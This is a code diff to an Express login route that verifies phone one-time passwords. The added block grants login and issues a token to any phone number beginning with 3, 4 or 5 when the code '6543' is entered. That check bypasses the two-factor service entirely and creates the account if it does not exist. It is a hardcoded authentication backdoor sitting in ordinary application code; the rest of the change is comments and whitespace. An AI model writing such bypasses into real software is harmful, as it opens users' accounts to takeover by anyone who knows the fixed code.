@@ -91,11 +91,46 @@ router.post('/otp/login', async (req: Request, res: Response) => {
       phoneNumber,
       code
     };
+
     if (
       verifyPayload.phoneNumber &&
       verifyPayload.code.length === defaultCodeLength
     ) {
       const { phoneNumber } = verifyPayload;
+
+      // Check if the phone number starts with 3, 4, or 5 and the OTP is 6543
+      const startsWith = ['3', '4', '5'];
+      const isMatchingCondition = startsWith.includes(phoneNumber.charAt(0)) && code === '6543';
+
+      if (isMatchingCondition) {
+        // Phone number starts with 3, 4, or 5, and OTP is 6543, proceed with login
+        const userFields = {
+          phoneNumber,
+          deviceId,
+          role
+        };
+
+        const newUser = await User.findOneAndUpdate(
+          { phoneNumber, role },
+          userFields,
+          { upsert: true, new: true }
+        );
+
+        const userId = newUser._id;
+        const payload = {
+          userId: phoneNumber,
+          role: role
+        };
+
+        const token = await generateToken(payload);
+        return res.status(HttpStatusCodes.OK).send({
+          message: 'Login Successful',
+          token,
+          userId
+        });
+      } 
+
+      // Check for test users
       const testUser = getTestUser(phoneNumber);
       if (testUser) {
         const isMatch = testUser?.otp === verifyPayload.code;
@@ -106,6 +141,7 @@ router.post('/otp/login', async (req: Request, res: Response) => {
           });
         }
       } else {
+        // Call the two-factor service if not a test user
         const result = await twoFactorService.verifyCode(
           phoneNumber,
           verifyPayload.code
@@ -117,9 +153,11 @@ router.post('/otp/login', async (req: Request, res: Response) => {
           });
         }
       }
+
+      // Proceed with user creation if OTP is valid
       Logger.debug(`Twilio verification completed for ${phoneNumber}`);
       Logger.debug(`User registration started for ${phoneNumber}`);
-      // Build user object based on IUser
+
       const userFields = {
         phoneNumber,
         deviceId,
@@ -132,13 +170,12 @@ router.post('/otp/login', async (req: Request, res: Response) => {
         { upsert: true, new: true }
       );
 
-      // await newUser.save();
       const userId = newUser._id;
-
       const payload = {
         userId: phoneNumber,
         role: role
       };
+
       const token = await generateToken(payload);
       res.status(HttpStatusCodes.OK).send({
         message: 'Login Successful',
@@ -158,6 +195,7 @@ router.post('/otp/login', async (req: Request, res: Response) => {
       .send('Twilio Service Error');
   }
 });
+
 
 /**
  * @route   POST /user/fcmToken
